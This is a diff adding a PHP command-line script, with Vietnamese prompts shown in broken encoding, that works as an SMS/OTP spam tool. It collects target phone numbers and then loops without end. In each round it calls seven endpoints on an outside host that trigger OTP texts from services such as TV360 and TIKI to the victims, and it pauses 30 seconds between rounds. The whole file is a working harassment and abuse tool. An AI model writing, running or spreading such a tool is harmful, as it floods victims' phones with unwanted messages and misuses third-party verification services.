@@ -1,0 +1,163 @@
+
+
+@system('clear');
+
+date_default_timezone_set("Asia/Ho_Chi_Minh");
+$Ngay=`date "+%d/%m/%Y"`;
+
+$BBlack="\033[1;32m" ; 
+$BRed="\033[1;32m" ;
+$BGreen="\033[1;32m" ;
+$BYellow="\033[1;32m" ;
+$BBlue="\033[1;32m" ;
+$BPurple="\033[1;32m" ;
+$BCyan="\033[1;32m" ;
+$BWhite="\033[1;32m" ;
+$Blue="\033[1;32m";
+$lime="\033[1;32m";
+$red="\033[1;32m";
+$xanh="\033[1;32m";
+$cyan="\033[1;32m";
+$yellow="\033[1;32m";
+$turquoise="\033[1;32m";
+$maugi="\033[1;32m";
+$white= "\033[1;32m";
+$xnhac = "\033[1;32m";
+$den = "\033[1;32m";
+$do = "\033[1;32m";
+$luc = "\033[1;32m";
+$vang = "\033[1;32m";
+$xduong = "\033[1;32m";
+$hong = "\033[1;32m";
+$trang = "\033[1;32m";
+$do="\033[1;32m";
+$useragent = "Mozilla/5.0 (Linux; Android 10; SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.1.4472.202 Mobile Safari/537.36";
+$van = "$do âžœ$luc";
+$vanv = "".$do."âž¤âž¤ ".$luc;
+
+$k = "0";
+$tt="0";
+$dem = "0";
+
+system("clear");
+
+
+echo "$van \033[1;32m 
+	                      .:d0XWMMMMWXOd:.
+	                 .cxl                  'xc'
+	             .cO'    .,coxO0KKKKKOkdl:'     Oc.
+	           cK.   ;d0WMMMMMMMMMMMMMMMMMMMNOl'   xl
+	        .x0   lKMMMMMMM,       'MMMMMMMMMMMMWk;  'k.
+	       xX  .kMMMMMM            KMMMMMMMMMMMMMMMNo  ;k
+	     ;W. .OMMMMMMMl           kMMMMMMMMMMMMMMMMMMWo  Oc
+	    kW  lMMMMM  oMM.         :MMMMMMMMMMMMMM: 'MMMMN. ;k
+	   KK  OMMMM;    XMN        .MMMMMMMMMMMMMMx    oMx    .K
+	  0W  KMMMM       MM0       NMMMMMMMMMMMMMX             ,K
+	 :M  OMMMM        'MMc     KMMMMMMMMMMMMMM               dc
+	 Mo 'MMMM'         oMM.   xMMMMMMMMMMMMMM.                M
+	,M. XMMMK           KMW  ;MMMMMMMMMMMMMM;                 k:
+	OM  MMMM:            MMK.MMMMMMMMMMMMMMd                  ,0
+	XW  MMMM'            'MMMMMMMMMMMMMMMMK                   .W
+	0M  MMMM,             oMMMMMMMMMMMMMMM                    'X
+	lM  MMMMx              KMMMMMMMMMMMMM.                    cd
+	.M, lMMMM               MMMMMMMMMMMM,                     N.
+	 kN  MMMM0              .MMMMMMMMMMl                     '0
+	  Mx .MMMMx              lMMMMMMMMO                      W
+	  .M: .MMMMO              KMMMMMMW               '      K.
+	   .Mc  MMMMN,             MMMMMM              lWMK,   K.
+	     Nx  dMMMM0'           .MMMM'            lNMMMM. .X
+	      :X,  0MMMMXl.         lMMl          ,kWMMMMc  d:
+	        dO.  cMMMMMXd;.      Kk       'cOWMMMMM.  ld
+	          ;0;   lMMMMMMWKOxolK0lldk0NMMMMMMM,  .dc
+	             kx,    'MMMMMMMMMMMMMMMMMMM    .lx
+	                .0o,.                  ..ck.
+	                      ckoc:;,,',,;coxl \n\n";
+
+
+
+$tsdt = [];
+$vv = 0;
+
+while(true){
+	$vv = $vv+1;
+echo $van." Nháº­p SÄT Cáº§n Spam Thá»© $vv : ".$do;
+$ttsdt = trim(fgets(STDIN));
+if($ttsdt == ''){break;}
+array_push($tsdt,$ttsdt);
+}
+
+$dem = $vv-1;
+
+while(true){
+for ($s = 0; $s < $dem ; $s++) {
+	
+$sdt = $tsdt[$s];
+
+echo $vanv."ÄANG SPAM Sá» : ".$do.$sdt." \n";
+
+
+$tongurl = [];
+$url = "http://vanhihi.ml/sms.php?sdt=".$sdt;
+array_push($tongurl,$url);
+$url = "http://vanhihi.ml/sms1.php?sdt=".$sdt;
+array_push($tongurl,$url);
+$url = "http://vanhihi.ml/sms2.php?sdt=".$sdt;
+array_push($tongurl,$url);
+$url = "http://vanhihi.ml/sms3.php?sdt=".$sdt;
+array_push($tongurl,$url);
+$url = "http://vanhihi.ml/sms4.php?sdt=".$sdt;
+array_push($tongurl,$url);
+$url = "http://vanhihi.ml/sms5.php?sdt=".$sdt;
+array_push($tongurl,$url);
+$url = "http://vanhihi.ml/sms6.php?sdt=".$sdt;
+array_push($tongurl,$url);
+
+for ($so = 0; $so < 7 ; $so++) {
+	if ( $so == 0 ){
+		$loai = "POPS";
+	}else if ( $so == 1 ){
+		$loai = "TV360";
+	}else if ( $so == 2 ){
+		$loai = "CLIPTV";
+	}else if ( $so == 3 ){
+		$loai = "META";
+	}else if ( $so == 4 ){
+		$loai = "BHX";
+	}else if ( $so == 5 ){
+		$loai = "TIKI";
+	}else if ( $so == 6 ){
+		$loai = "VIETON";
+	}
+	$url_sp = $tongurl[$so];
+	$spam = file_get_contents($url_sp);
+	$gio = date("H:i");
+	$tt = $tt +1;
+	if ( $spam == "PENDING" ){
+	
+    echo "".$do." | ".$BBlue.    $tt.$do." | ".$luc.$gio.$do." | ".$trang."SPAMSMS".$do." | ".$vang.$loai.$do." | ".$luc.$sdt.$do." |\n";
+    }else{
+    	echo "".$do." | ".$BBlue.    $tt.$do." | ".$luc.$gio.$do." | ".$trang."SPAMSMS".$do." | ".$vang.$loai.$do." |".$luc."Sá»‘ $sdt ÄÃ£ Háº¿t Sá»‘ Láº§n Gá»­i OTP".$do."|\n";
+    }
+   
+}### trong
+
+}##ngoÃ i 
+
+for($m=30;$m>-1;$m--){
+
+echo "".$trang."[".$do."Tráº¡ng tool".$trang."]--[".$vang.$m.$trang."]              \r";
+usleep(170000);
+echo "".$trang."[".$do."Tráº¡ng tool".$trang."]----[".$vang.$m.$trang."]            \r";
+usleep(170000);
+echo "".$trang."[".$do."Tráº¡ng tool".$trang."]------[".$vang.$m.$trang."]          \r";
+usleep(170000);
+echo "".$trang."[".$do."Tráº¡ng tool".$trang."]-------[".$vang.$m.$trang."]          \r";
+usleep(170000);
+echo "".$trang."[".$do."Tráº¡ng tool".$trang."]--------[".$vang.$m.$trang."]          \r";
+usleep(170000);
+
+}
+
+
+
+}
